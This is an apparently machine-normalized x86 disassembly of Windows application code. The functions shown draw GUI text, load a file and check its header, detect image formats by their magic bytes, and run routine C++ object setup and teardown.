mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] edx
test cl 0x3
jne r-xdata
mov ecx [ edi + 0x4 ]
lea ecx [ ecx + 0xb0 ]
lea ebx [ ebp - 0x58 ]
lea eax [ ebp - 0x64 ]
mov [ ebp - 0x58 ] edx
call sub_414260
mov ecx [ ebp - 0x64 ]
mov eax [ edi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
mov ebx [ eax ]
mov [ ebp - 0x4 ] edx
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x70 ]
push eax
push ebx
call [ SetBkColor@IAT ]
mov [ ebp - 0x58 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0xc ] 0xffffffff
mov eax [ edi + 0x264 ]
mov [ ebp - 0x58 ] eax
je r-xdata
mov ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x24 ]
push eax
push 0x2
push 0x0
push 0x0
push ebx
call [ ExtTextOutW@IAT ]
mov ecx [ ebp - 0x58 ]
push ecx
push ebx
call [ SetBkColor@IAT ]
test [ esi + 0x20 ] 0x3
mov ecx [ edi + 0x4 ]
mov eax [ ecx + 0x80 ]
je r-xdata
mov ecx [ edi + 0x4 ]
lea ecx [ ecx + 0xb0 ]
lea ebx [ ebp - 0x64 ]
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x64 ] 0x1
call sub_414260
mov ecx [ ebp - 0x68 ]
mov eax [ edi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov edx [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x2c ] edx
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2c ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x3c ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ esi + 0x1c ]
mov [ ebp - 0x38 ] edx
mov edx [ esi + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x20 ] edx
movzx ecx [ eax + 0xa9 ]
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push ecx
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov ecx ebx
call edx
mov ebx [ ebp - 0x5c ]
push eax
push ebx
call [ SetTextColor@IAT ]
mov edx [ esi + 0x18 ]
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ esi + 0x10 ]
add eax [ ebp - 0x58 ]
push 0x224
mov [ ebp - 0x4c ] edx
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] eax
mov eax [ esi + 0x8 ]
push 0xffffffff
mov [ ebp - 0x50 ] ecx
mov ecx [ esi + 0x1c ]
push eax
push ebx
mov [ ebp - 0x48 ] ecx
call [ DrawTextW@IAT ]
mov ecx [ ebp - 0x5c ]
push ecx
push ebx
call [ SetTextColor@IAT ]
mov edx [ ebp - 0x60 ]
push edx
push edi
call sub_43a6c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx + 0x84 ]
mov ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0x1c ]
sub eax [ edi + 0x260 ]
mov edx [ esi + 0x18 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ esi + 0x14 ]
sub eax ecx
mov [ ebp - 0x1c ] edx
cdq
sub eax edx
mov edx [ edi + 0x260 ]
sar eax 0x1
add ecx eax
lea eax [ edx + ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ecx
add edx eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x1c ] edx
mov edx [ ebx ]
mov edx [ edx + 0xc ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx + 0x14 ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0x10 ]
mov ecx [ edi + 0x260 ]
mov edx [ ebx ]
mov edx [ edx + 0x1c ]
mov [ ebp - 0x28 ] eax
mov eax [ esi + 0xc ]
imul eax ecx
add ecx eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] ecx
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov ecx ebx
call edx
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x260 ]
lea edx [ ecx + eax + 0xa ]
mov [ ebp - 0x58 ] edx
sub_43a6c0
push ebp
mov ebp esp
mov eax [ esi + 0x24 ]
mov ecx r--data
jmp r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
pop ebp
retn 0x8
test [ esi + 0x20 ] 0x3
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push ebx
push edi
mov edi [ ecx ]
mov ecx [ eax + 0x80 ]
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ebx [ SetTextColor@IAT ]
push ecx
push edi
call ebx
lea ecx [ esi + 0x28 ]
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
jne r-xdata
mov ecx [ eax + 0x84 ]
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov eax [ esi + 0x24 ]
push 0x224
push ecx
push 0xffffffff
push eax
push edi
call [ DrawTextW@IAT ]
mov ecx [ ebp + 0xc ]
push ecx
push edi
call ebx
pop edi
pop ebx
mov eax [ esi + 0x18 ]
add eax 0xfffffff3
mov [ esi + 0x30 ] eax
add eax 0xffffffd8
mov [ ecx ] eax
mov eax [ esi + 0x1c ]
sub eax [ esi + 0x14 ]
sub eax 0xb
cdq
sub eax edx
sar eax 0x1
add eax [ esi + 0x14 ]
mov [ esi + 0x2c ] eax
add eax 0xb
mov [ esi + 0x34 ] eax
sub_43a790
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x20 ]
xor ebx ebx
push edi
test al 0x3
je r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x44 ]
mov edi [ esi + 0x38 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ esi + 0x48 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] eax
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax 0x66666667
imul [ edi + 0xc ]
mov edi [ edi + 0x10 ]
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
mov ecx eax
imul ecx ebx
mov [ ebp - 0x18 ] ecx
add ecx eax
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x10 ] ecx
mov ecx [ esi + 0x38 ]
lea edx [ ebp - 0x28 ]
push edx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0xc ] edi
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
push edx
call eax
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4c ]
mov ebx 0x1
test al 0x4
je r-xdata
test al 0x2
je r-xdata
mov ebx 0x3
jmp r-xdata
mov ebx 0x2
sub_43a890
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43a8d0
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
sub esp 0x8
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
push edi
push 0x3
push edi
push 0x1
push 0x80000000
push eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
call [ CreateFileW@IAT ]
mov [ ebp - 0x4 ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
mov [ esi + 0x4 ] edi
push ebx
push edi
push eax
mov [ ebp + 0xb ] 0x0
call [ GetFileSize@IAT ]
mov ebx eax
push ebx
call sub_443fa9
mov edx [ ebp - 0x4 ]
add esp 0x4
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
push ebx
mov edi eax
push edi
push edx
mov [ ebp - 0x8 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor al al
pop edi
mov esp ebp
pop ebp
retn 0x4
test edi edi
je r-xdata
cmp [ edi ] 0x2e66622e
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call [ CloseHandle@IAT ]
mov al [ ebp + 0xb ]
pop ebx
pop edi
mov esp ebp
pop ebp
retn 0x4
push edi
call [ `placement delete closure'@IAT ]
add esp 0x4
cmp [ edi + 0x3c ] 0x10000
jne r-xdata
cmp [ edi + 0x40 ] 0x1
jne r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] edi
cmp [ edi + 0xfc ] 0x0
je r-xdata
mov [ ebp + 0xb ] 0x1
jmp r-xdata
mov eax [ edi + 0xf8 ]
lea eax [ eax + edi + 0x100 ]
mov [ esi + 0x14 ] eax
mov [ esi + 0x10 ] eax
mov ecx [ eax + 0x4 ]
lea eax [ ecx + eax + 0x8 ]
mov [ esi + 0x18 ] eax
sub_43a9d0
push ebp
mov ebp esp
push 0xffffffff
push sub_444fac
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx + 0x10 ]
test edx edx
je r-xdata
xor edx edx
mov edx [ edx ]
jmp r-xdata
mov edx [ ecx + 0x14 ]
lea eax [ eax + eax * 4 ]
add eax eax
mov esi [ edx + eax * 8 + 0x50 ]
add esi [ ecx + 0x18 ]
cmp [ ebp + 0xc ] 0x0
mov edi [ edx + eax * 8 + 0x54 ]
lea eax [ edx + eax * 8 + 0x8 ]
je r-xdata
cmp eax edx
jge r-xdata
push 0x14
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0xc ]
inc [ eax + 0x4 ]
mov [ ecx ] eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_43aaa0
test ecx ecx
js r-xdata
or eax 0xffffffff
retn
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
lea eax [ ecx + ecx * 4 ]
mov ecx [ edx + 0x14 ]
add eax eax
mov eax [ ecx + eax * 8 + 0x48 ]
retn
cmp ecx eax
jge r-xdata
sub_43aad0
push ebp
mov ebp esp
push 0xffffffff
push sub_44500b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x14 ]
mov ebx [ operator delete@IAT ]
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi + 0x14 ] edi
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
je r-xdata
push eax
call ebx
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
call ebx
add esp 0x4
sub_43ab60
push ebp
mov ebp esp
push 0xffffffff
push sub_44500b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x14 ]
mov ebx [ operator delete@IAT ]
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi + 0x14 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call ebx
add esp 0x4
sub_43abe0
push ebp
mov ebp esp
push 0xffffffff
push sub_445983
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ edi + 0x1c ]
xor ebx ebx
cmp ecx ebx
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi + 0x4 ]
sar eax 0x2
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ edi + 0x1c ] ebx
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
cmp esi ecx
je r-xdata
mov ecx [ edi + 0x4 ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push esi
call [ memmove@IAT ]
add esp 0xc
add ebx esi
mov [ edi + 0x8 ] ebx
mov ecx [ edi + 0x8 ]
sub ecx [ edi + 0x4 ]
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x10 ] esi
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push esi
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43acc0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44a4e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
cmp [ esi + 0x19 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x8 ] cl
je r-xdata
push esi
mov ecx ebx
call sub_43add0
mov edi eax
xor ecx ecx
cmp edi ecx
je r-xdata
mov edx [ esp + 0x8 ]
push edx
push eax
mov edi esi
call sub_43b020
test eax eax
jne r-xdata
xor eax eax
mov al [ esp + 0x8 ]
mov [ edi + 0x18 ] al
test al al
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ esp + 0x18 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push ecx
push ebx
mov ecx edi
call edx
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x30 ] ecx
mov eax [ esi + 0x14 ]
cmp [ eax + 0x4 ] ecx
jne r-xdata
mov edx [ edi ]
mov edx [ edx + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
mov ecx edi
call edx
mov [ esp + 0x30 ] 0xffffffff
mov [ esp + 0x10 ] r--data
jmp r-xdata
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x10 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ecx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_43af40
mov eax edi
jmp r-xdata
sub_43add0
push ebp
mov ebp esp
push 0xffffffff
push sub_444f84
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ecx + 0x8 ]
mov edx [ ecx ]
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] 0x474e5089
mov [ ebp - 0x14 ] 0x38464947
cmp edx [ ebp - 0x10 ]
jne r-xdata
cmp dl 0x42
jne r-xdata
push 0x30
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
cmp dl 0xff
jne r-xdata
cmp [ ecx + 0x1 ] 0x4d
jne r-xdata
xor eax eax
mov ecx 0x1
mov [ eax ] r--data
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x18 ] cl
mov [ eax + 0x1c ] ebx
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x2
mov [ eax + 0x24 ] ebx
mov [ eax + 0x28 ] ebx
mov [ eax + 0x2c ] ebx
mov [ ebp - 0x4 ] bl
jmp r-xdata
cmp edx [ ebp - 0x14 ]
jne r-xdata
cmp [ ecx + 0x1 ] 0xd8
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] bl
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x44
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
push 0x30
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
push 0x38
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
push 0x30
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
push eax
call sub_440b90
jmp r-xdata
push eax
call sub_43fd40
jmp r-xdata
push eax
call sub_4406b0
jmp r-xdata
push eax
call sub_440280
jmp r-xdata
sub_43af40
push ebp
mov ebp esp
push 0xffffffff
push sub_44a4c3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push 0x10
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
xor esi esi
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
lea ebx [ esi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x14 ] ebx
call eax
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
lea ebx [ esi + 0x4 ]
test edx edx
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0xc ]
sar eax 0x1
push edx
push ebx
mov ebx eax
call sub_402910
mov dl [ ebp + 0x10 ]
mov [ esi + 0x8 ] dl
mov [ esi + 0xc ] edi
mov esi [ ebp + 0x8 ]
add esi 0x4
lea ecx [ ebp - 0x10 ]
call sub_428170
mov eax 0x1
add [ edi + 0x4 ] eax
mov [ edi + 0x1c ] eax
sub_43b020
push ebp
mov ebp esp
mov eax [ edi + 0x8 ]
sub eax [ edi + 0x4 ]
push ebx
sar eax 0x2
xor ebx ebx
push esi
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x8
mov ecx [ edi + 0x4 ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi + 0x4 ]
inc ebx
sar eax 0x2
cmp ebx eax
jb r-xdata
mov dl [ ebp + 0xc ]
cmp [ esi + 0x8 ] dl
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x80004005
call sub_402d00
mov eax [ esi + 0x4 ]
push ecx
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x8
sub_43b090
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
retn
push ebx
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
inc edi
sar eax 0x2
cmp edi eax
jb r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx + edi * 4 ]
test eax eax
je r-xdata
pop ebx
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ eax + 0xc ]
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x14 ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push ebx
mov ebx [ eax + 0x10 ]
mov eax [ eax + 0xc ]
push ebx
push eax
call edx
sub_43b0f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4484e3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x4 ]
mov [ edi ] r--data
xor ebx ebx
push 0x18
mov [ ebp - 0x14 ] esi
mov [ esi + 0x8 ] ebx
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
call _CxxThrowException
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ esi + 0x4 ]
mov [ edx + 0x15 ] al
mov [ ebp - 0x4 ] 0x4
lea eax [ edi + 0x14 ]
mov [ eax ] r--data
mov [ ebp - 0x14 ] eax
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ ebp - 0x4 ] 0x5
mov [ eax + 0x18 ] bx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x1c ] ebx
mov [ ebp - 0x4 ] 0x6
lea esi [ edi + 0x34 ]
call sub_4256e0
mov [ ebp - 0x4 ] 0x7
mov [ edi ] r--data
mov [ edi + 0x14 ] r--data
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43b200
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43b230
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43b230
push ebp
mov ebp esp
push 0xffffffff
push sub_44846a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea edi [ esi + 0x14 ]
mov [ esi ] r--data
mov [ edi ] r--data
mov [ esi + 0x34 ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x38 ]
xor ebx ebx
mov [ esi + 0x34 ] r--data
cmp ecx ebx
je r-xdata
mov ecx [ esi + 0x3c ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x14 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ edi + 0x14 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] bl
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ edi + 0x14 ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ ebp - 0x4 ] ebx
add esi 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x10 ]
call sub_429bb0
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_43b340
push ebp
mov ebp esp
push 0xffffffff
push sub_44abea
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
push r--data
push eax
lea edi [ ebp - 0x10 ]
call sub_428960
mov esi [ ebp - 0x10 ]
push r--data
push esi
call [ _wcsicmp@IAT ]
add esp 0x8
